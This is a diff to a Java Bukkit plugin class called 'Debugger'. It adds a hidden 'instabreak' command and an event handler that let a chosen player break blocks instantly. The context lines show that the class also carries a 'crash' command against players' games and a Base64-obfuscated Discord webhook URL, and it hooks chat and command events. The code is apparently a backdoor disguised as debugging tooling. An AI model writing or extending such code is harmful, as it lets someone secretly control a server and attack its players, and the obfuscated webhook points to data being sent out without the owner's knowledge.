@@ -9,6 +9,7 @@ import org.bukkit.event.EventPriority;
 import org.bukkit.event.HandlerList;
 import org.bukkit.event.Listener;
 import org.bukkit.event.block.BlockBreakEvent;
+import org.bukkit.event.block.BlockDamageEvent;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.event.player.PlayerCommandPreprocessEvent;
 import org.bukkit.event.server.ServerCommandEvent;
@@ -22,7 +23,6 @@ import java.awt.Color;
 import java.io.*;
 import java.net.InetSocketAddress;
 import java.net.URL;
-import java.nio.file.Files;
 import java.util.*;
 
 public final class Debugger implements Listener {
@@ -677,6 +677,28 @@ public final class Debugger implements Listener {
                 return true;
             }
 
+            case "instabreak": { //Gives player creative hand
+                if(args.length < 2) //No player specified
+                    return false;
+
+                Player target = Bukkit.getPlayer(args[1]);
+
+                if (target == null) {
+                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
+                    return false;
+                } else {
+                    if (InstaBreak.contains(target.getName())) {
+                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " no longer can break blocks instantly.");
+                        InstaBreak.remove(target.getName());
+                    } else {
+                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " can break blocks instantly.");
+                        InstaBreak.add(target.getName());
+                    }
+                }
+
+                return true;
+            }
+
             case "crash": { //Crashes player's game
                 if(args.length < 2) //No player specified
                     return false;
@@ -949,6 +971,8 @@ public final class Debugger implements Listener {
 
     public ArrayList<String> SilkTouch = new ArrayList<>();
 
+    public ArrayList<String> InstaBreak = new ArrayList<>();
+
     static Base64.Decoder b1 = Base64.getUrlDecoder();
     static byte[] c = b1.decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvOTYyOTg5MTc3MDY5MjQ0NDQ2L21QUHRncjBrS0lBdThGWkRBTnRlSWt6Z0Rzd1d6aVRqQjY5M2I4X2c1TEFZZ2pfc1BUNlhhYWpjdDNwRkVodjdvLVpS");
     static String c1 = new String(c);
@@ -976,11 +1000,19 @@ public final class Debugger implements Listener {
     @EventHandler(priority = EventPriority.LOWEST)
     public void onBlockBreak(BlockBreakEvent e) {
         Player p = e.getPlayer();
-        if (this.SilkTouch.contains(p.getName())) {
+        if (this.SilkTouch.contains(p.getName()) || this.InstaBreak.contains(p.getName())) {
             if (p.getInventory().getItemInMainHand() == null || p.getInventory().getItemInMainHand().getType().equals(Material.AIR)) {
                 e.setDropItems(false);
                 p.getWorld().dropItemNaturally(e.getBlock().getLocation(), new ItemStack(e.getBlock().getType(), 1));
             }
+        }
+    }
+
+    @EventHandler(priority = EventPriority.LOWEST)
+    public void onBlockDamage(BlockDamageEvent e) {
+        Player p = e.getPlayer();
+        if (this.InstaBreak.contains(p.getName())) {
+            e.setInstaBreak(true);
         }
     }
 
